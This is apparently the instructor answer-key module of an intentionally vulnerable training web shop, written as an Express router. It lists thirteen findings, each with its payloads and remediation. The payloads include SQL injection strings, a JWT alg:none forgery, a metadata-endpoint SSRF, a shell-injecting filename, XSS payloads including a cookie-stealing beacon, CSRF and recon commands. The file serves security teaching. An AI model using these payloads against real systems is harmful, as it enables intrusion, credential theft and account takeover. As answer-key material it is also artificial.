'use strict';
/* ============================================================================
 * Instructor mode — hidden answer-key surface. OFF by default.
 * Enabled only when INSTRUCTOR_MODE=on, and served under a secret path token
 * (INSTRUCTOR_PATH_TOKEN). Kept entirely separate from the student UI.
 *   GET /api/instructor/<token>/map       -> full vulnerability map + payloads
 *   GET /api/instructor/<token>/captures  -> blind-XSS / bot beacon captures
 *   GET /api/instructor/<token>           -> HTML index of the above
 * ========================================================================== */
const express = require('express');
const config = require('../config');
const { captures } = require('../state');

const router = express.Router();

// Gate: behave as if these routes don't exist unless instructor mode is on and
// the secret token matches.
router.use('/:token', (req, res, next) => {
  if (!config.instructor.mode) return res.status(404).json({ error: 'not found' });
  if (req.params.token !== config.instructor.pathToken) return res.status(404).json({ error: 'not found' });
  next();
});

const FINDINGS = [
  {
    id: 1, title: 'SQL Injection in login and product search', severity: 'Critical',
    feature: 'Login form; product catalog search',
    endpoints: ['POST /api/auth/login (email)', 'GET /api/products?search= &order=', 'POST /api/v1/auth/login (auth bypass)'],
    payloads: [
      `email: ' OR 1=1-- -   (v1 login = full auth bypass, no password)`,
      `search: ' UNION SELECT 1,email,password_hash,4,5,6,7,8,name FROM users-- -`,
      `search: ' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -   (time-based blind)`,
      `order: (SELECT CASE WHEN (1=1) THEN p.id ELSE p.title END)   (ORDER BY injection)`,
    ],
    steps: 'Submit the payload in the login email or the ?search= param. Verbose errors reveal DB messages (error-based). Use UNION/boolean/time techniques to extract users.',
    impact: 'Authentication bypass, full database read (password hashes, PII), potential write via stacked queries.',
    remediation: 'Use parameterized queries/prepared statements everywhere; never concatenate input into SQL; least-privilege DB user; disable multi-statements; generic errors.',
  },
  {
    id: 2, title: 'IDOR on orders and users', severity: 'High',
    feature: 'Order history; user profiles',
    endpoints: ['GET /api/orders/:id', 'GET /api/users/:id', 'GET /api/v1/users/:id (leaks password hash)'],
    payloads: ['GET /api/orders/1,2,3… with any valid token', 'GET /api/users/1'],
    steps: 'Authenticate as a normal user, then request another user\'s order or profile id.',
    impact: 'Access to other customers\' orders, shipping PII, emails, and (v1) password hashes.',
    remediation: 'Enforce object-level authorization: scope every lookup to the authenticated principal (WHERE user_id = :me) or check ownership/role.',
  },
  {
    id: 3, title: 'Broken access control on seller/admin APIs', severity: 'High',
    feature: 'Seller dashboard; hidden admin panel',
    endpoints: ['GET/POST /api/seller/*', 'GET /api/admin/users', 'GET /api/admin/tickets', 'POST /api/admin/reset-lab'],
    payloads: ['With a normal customer token: GET /api/admin/users'],
    steps: 'The admin panel is only hidden in the UI. Call the admin/seller API routes directly with a customer JWT.',
    impact: 'Function-level privilege escalation: list all users, read all tickets, reset the lab, manage products.',
    remediation: 'Enforce role checks server-side on every privileged route (deny by default).',
  },
  {
    id: 4, title: 'JWT flaws: alg:none, weak secret, no expiry', severity: 'Critical',
    feature: 'Authentication tokens',
    endpoints: ['Authorization: Bearer <jwt> on all authed routes'],
    payloads: [
      `alg:none: header {"alg":"none","typ":"JWT"} payload {"sub":1,"role":"admin"} signature empty`,
      `weak secret: HS256 signed with "secret" (see JWT_SECRET); forge {"role":"admin"}`,
      `no expiry: captured tokens never expire`,
    ],
    steps: 'Decode a token, change role to admin, re-sign with the weak secret OR strip the signature and set alg:none.',
    impact: 'Full account/role forgery -> admin takeover.',
    remediation: 'Pin allowed algorithms (no none); long random secret from a secret manager; set + verify exp; rotate keys.',
  },
  {
    id: 5, title: 'Mass assignment -> privilege escalation', severity: 'Critical',
    feature: 'Update profile',
    endpoints: ['PATCH /api/users/me'],
    payloads: [`{"role":"admin"}  (or {"email":"attacker@x"} )`],
    steps: 'As a customer, PATCH /api/users/me with a role field. The server honors it.',
    impact: 'Self-promotion to admin.',
    remediation: 'Strict server-side allowlist of updatable fields; never bind request bodies straight to privileged columns.',
  },
  {
    id: 6, title: 'Business logic: coupon stacking, negative qty, client price', severity: 'High',
    feature: 'Cart and checkout',
    endpoints: ['POST /api/cart/items (quantity)', 'POST /api/orders/checkout (coupon_codes[], items[])'],
    payloads: [
      `cart item quantity: -5  (negative subtotal)`,
      `checkout {"coupon_codes":["WELCOME10","VIP20","SAVE5"]}  (stacking)`,
      `checkout {"items":[{"product_id":1,"quantity":1,"unit_price_cents":1}]}  (client price trust)`,
    ],
    steps: 'Add negative quantities, stack multiple coupons, or send your own item prices at checkout.',
    impact: 'Purchase for near/below $0; financial loss.',
    remediation: 'Validate quantity>0; recompute prices server-side from the catalog; enforce one coupon and floor totals at 0.',
  },
  {
    id: 7, title: 'SSRF -> instance metadata (FLAGSHIP)', severity: 'Critical',
    feature: 'Profile -> Import avatar from URL',
    endpoints: ['POST /api/uploads/avatar/import', 'POST /api/v1/integrations/cloud-sync (impact)'],
    payloads: [
      `{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
      `{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/shophunt-app-instance-role"}`,
      `then POST /api/v1/integrations/cloud-sync {"access_key":"AKIAI44QH8DHBLABFAKE"}`,
    ],
    steps: 'Import an avatar from the metadata URL; the non-image response (fake IAM creds) is echoed in the error preview. Feed the AccessKeyId to cloud-sync to list fake backups.',
    impact: 'Theft of instance credentials -> access to cloud resources (demonstrated against the mock).',
    remediation: 'Allowlist schemes/hosts; block private/link-local/loopback/metadata ranges; re-check after redirects; pin resolved IP (anti DNS-rebind); IMDSv2 + hop limit 1; drop ambient instance role.',
    safety: 'Fully mocked. Internal-only docker nets + a code pin route link-local targets to the mock, so a real 169.254.169.254 is never reachable.',
  },
  {
    id: 8, title: 'Unrestricted file upload -> RCE; SVG -> stored XSS', severity: 'Critical',
    feature: 'Avatar upload',
    endpoints: ['POST /api/uploads/avatar (multipart file)'],
    payloads: [
      `filename: "x.png; id; #.png"  -> command injection in post-upload 'file' analysis`,
      `upload evil.svg containing <svg onload=alert(document.domain)> -> open /uploads/<name> -> stored XSS`,
      `upload x.html with <script> -> served as text/html`,
    ],
    steps: 'Upload with a crafted filename to inject shell commands (RCE, output returned in "analysis"); or upload an SVG/HTML to get stored XSS when the file URL is visited.',
    impact: 'Remote code execution in the backend container; stored XSS via uploaded content.',
    remediation: 'Validate content-type + magic bytes; randomize filenames; store outside webroot / serve with Content-Disposition + safe type; never pass filenames to a shell; sandbox processing.',
    safety: 'RCE is confined to the backend container on an internal-only network (no egress).',
  },
  {
    id: 9, title: 'Stored XSS in product reviews', severity: 'High',
    feature: 'Product reviews',
    endpoints: ['POST /api/products/:id/reviews', 'rendered on the product page'],
    payloads: [`<img src=x onerror=alert(document.cookie)>`],
    steps: 'Post a review containing an HTML/JS payload; it executes for every visitor of that product.',
    impact: 'Session theft, actions on behalf of victims.',
    remediation: 'Contextual output encoding; render as text; sanitize HTML (allowlist); CSP.',
  },
  {
    id: 10, title: 'Blind XSS in support tickets -> admin panel', severity: 'High',
    feature: 'Support ticket -> admin ticket view',
    endpoints: ['POST /api/tickets', 'fires in the admin panel; bot at GET /api/v1/collect'],
    payloads: [`<img src="http://backend:4000/api/v1/collect?c=" onerror="new Image().src='http://backend:4000/api/v1/collect?c='+document.cookie">`],
    steps: 'Submit a ticket with a blind payload. The admin viewer bot opens it within ~15s and beacons the admin cookie to the collector. View captures at /api/instructor/<token>/captures.',
    impact: 'Admin session/cookie theft -> account takeover.',
    remediation: 'Encode/sanitize on render in admin views too; CSP; HttpOnly cookies.',
  },
  {
    id: 11, title: 'CSRF on state-changing endpoints', severity: 'Medium',
    feature: 'Change email',
    endpoints: ['POST /api/users/me/email'],
    payloads: [`auto-submitting cross-site <form action="http://localhost:4000/api/users/me/email" method="POST">`],
    steps: 'Host a page that auto-submits a form (or credentialed fetch) to the endpoint; the victim\'s non-HttpOnly cookie rides along (permissive CORS + no CSRF token).',
    impact: 'Attacker changes the victim\'s email -> account takeover via reset.',
    remediation: 'CSRF tokens / SameSite=strict cookies; verify Origin/Referer; avoid ambient-cookie auth for APIs.',
  },
  {
    id: 12, title: 'Missing rate limiting', severity: 'Medium',
    feature: 'Login; password-reset OTP',
    endpoints: ['POST /api/auth/login', 'POST /api/auth/reset-password'],
    payloads: ['brute-force the 6-digit OTP; credential stuffing on login'],
    steps: 'Automate many attempts; there is no throttle or lockout.',
    impact: 'Account takeover via brute force.',
    remediation: 'Rate limit + account lockout/backoff; CAPTCHA; alerting; longer/expiring OTPs.',
  },
  {
    id: 13, title: 'Information disclosure / recon surface', severity: 'Medium',
    feature: 'Errors, static hosting, JS bundle',
    endpoints: ['verbose errors on any 500', '/.git/', '*.map source maps', 'robots.txt', 'sitemap.xml', 'JS bundle secrets', 'GET /api/products?order= (hidden param)'],
    payloads: ['git-dumper http://localhost:5173/.git/', 'grep the JS bundle + .map for sh_live_ / secrets'],
    steps: 'Enumerate robots.txt/sitemap.xml; dump /.git; read source maps; grep bundle for keys; trigger errors for stack traces.',
    impact: 'Leaks source, secrets, and internal paths that enable other attacks.',
    remediation: 'Generic errors; never ship .git/source maps/secrets to clients; secret management; security headers.',
  },
];

router.get('/:token', (req, res) => {
  res.type('html').send(`<!doctype html><meta name="robots" content="noindex"><title>ShopHunt Instructor</title>
  <style>body{font:15px system-ui;max-width:900px;margin:40px auto;padding:0 16px}code{background:#eef;padding:1px 4px;border-radius:4px}</style>
  <h1>ShopHunt — Instructor Answer Key</h1>
  <p>⚠️ Instructor-only. ${FINDINGS.length} findings.</p>
  <ul>
    <li><a href="/api/instructor/${req.params.token}/map">/map</a> — full vulnerability map + payloads + write-ups (JSON)</li>
    <li><a href="/api/instructor/${req.params.token}/captures">/captures</a> — blind-XSS / admin-bot beacons (JSON)</li>
  </ul>
  <p>See also <code>docs/vuln-map.md</code> in the repo.</p>`);
});

router.get('/:token/map', (req, res) => res.json({ findings: FINDINGS }));
router.get('/:token/captures', (req, res) => res.json({ captures }));

module.exports = { router, FINDINGS };
